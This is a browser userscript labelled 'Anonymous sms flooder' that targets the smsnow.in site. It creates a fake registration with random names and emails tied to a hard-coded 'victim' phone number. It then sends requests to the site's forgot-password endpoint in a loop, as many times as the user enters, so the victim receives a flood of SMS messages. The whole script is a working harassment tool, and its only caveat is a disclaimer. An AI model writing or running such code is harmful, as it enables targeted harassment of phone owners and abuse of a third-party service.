// ==UserScript==
// @name          Anonymous sms flooder 
// @namespace     nandu :P
// @include       http://*smsnow.in/*
// ==/UserScript==


//I am not responsible for any misuse of this script..
// Dont spam, ur ip can be tracked by the site if the receiver complains

var name='';
var victim= "'98977";

if(document.location=="http://www.smsnow.in/userRegistration.php"||document.location=="http://smsnow.in/userRegistration.php")
{
var chars = "abcdefghiklmnopqrstuvwxyz";
for (var i=0; i<10; i++) 
{
var rnum = Math.floor(Math.random() * chars.length);
name += chars.substring(rnum,rnum+1);
}
document.getElementById('name').value=name;
document.getElementById('mobileno').value=victim;
document.getElementById('email').value='sdsa'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.getElementById('child1DOB').value=Math.floor(Math.random()*29);
document.getElementsByName('child1DOByear')[0].value="198"+Math.floor(Math.random()*9);void(0);
document.getElementsByName('C32')[0].checked= true;
document.getElementsByName('register')[0].click();void(0);
}


function sendSMS(no, n) {
    with(x = new XMLHttpRequest()) open("POST", "forgotpass_check.php", false), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send("mobileno=" + no);
    r = "Failed to send!";
    if (x.responseText.replace(/^\s+|\s+$/g, "") == "yes") r = "Sent to " + no + " #" + n + "!";
    return r;
}


if(document.location=="http://www.smsnow.in/forgotpassword.php"||document.location=="http://smsnow.in/forgotpassword.php")
{
document.getElementById('mobileno').value=victim;
void(0);
var reply= prompt("enter the number of messages you want to send", "")

for(i=1;i<reply;i++)
sendSMS(victim, reply);

}



if(document.location=='http://www.smsnow.in/'||document.location=='http://smsnow.in/')
document.location='http://www.smsnow.in/forgotpassword.php';